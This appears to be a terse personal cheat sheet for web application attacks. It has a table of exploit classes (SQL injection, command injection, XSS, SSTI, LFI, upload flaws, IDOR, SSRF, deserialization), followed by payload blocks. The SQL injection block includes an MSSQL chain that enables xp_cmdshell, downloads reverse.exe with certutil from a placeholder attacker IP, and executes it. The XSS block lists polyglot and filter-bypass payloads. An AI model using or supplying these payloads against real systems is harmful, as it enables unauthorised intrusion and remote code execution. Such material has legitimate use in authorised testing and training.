# UltraWeb-Manuals-Methods

```



```

| Web Exploits    | Strategy                                                                               | Tools                                  | Technique                                              |
| --------------- | -------------------------------------------------------------------------------------- | -------------------------------------- | ------------------------------------------------------ |
| SQLi            | Database enumeration -> Column number -> Determine Output layout ->  Objectives - WiRE | ffuf, burpsuite                        | `admin' 1 or 1=1 -- - ... '1'=1`                       |
| cmd injection   | Strategy                                                                               | `para?;` `/cgi-bin`                    |                                                        |
| XXS             | Strategy                                                                               | burpsuite                              | `<imgsrc= />` ... polyglots                            |
| SSTI            | Strategy                                                                               | `{{7*7}} -> Confirm backend`           |                                                        |
| Path traversal  | Strategy                                                                               |                                        |                                                        |
| LFI             | Strategy                                                                               | ....// ../../ url encoding             |                                                        |
| upload vulns    | Strategy                                                                               | hexedit, burpsuite                     | .ext, content-type, mime-type, magic numbers, filesize |
| IDOR            | Strategy                                                                               | id=1 -> id=0                           |                                                        |
| CSRF            | User interaction required!                                                             |                                        |                                                        |
| SSRF            | Strategy                                                                               |                                        | 127.0.0.1, yourIP, OtherIPs                            |
| deserialization | Strategy                                                                               | firefox console, cookie manager plugin | jwt deserialization, idor, ysoserial                   |


#### CMDi

```bash
#  `param?=;` `/cgi-bin`

<symbol><maybewhitespace><cmd>

```

#### SQLi

```sql

--MySQL
'version(),'
--MySQL and MSSQL
',INPUT=@@version,INPUT='
--  Oracle
',INPUT=(SELECT banner FROM v$version),email='
-- For SQLite
',INPUT=sqlite_version(),INPUT='
-- Old classics
' or 1=1 -- -
user=admin&pass=' OR '1'='1'


-- MSSQL 
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

'; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --

'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
```

#### SSTI

```python
{{7*7}} # -> Confirm backend
```


#### Upload Vulns

```bash
# hexedit, burpsuite, cyberchef 
# .ext, content-type, mime-type, magic numbers, filesize
```

#### XXS 

Filtering of characters
```javascript
< > ' " { } ;

// imgsrc is mostly never blocked
<imgsrc= />

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Hacked') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Havked')//>\x3e

\%22})))}catch(e)alert(document.domain);}//
"];)catch(e)()if(!self.a)self.a=!alert(document.domain);//
"a")(((type:"ready")));)catch(e)alert(1))//
```

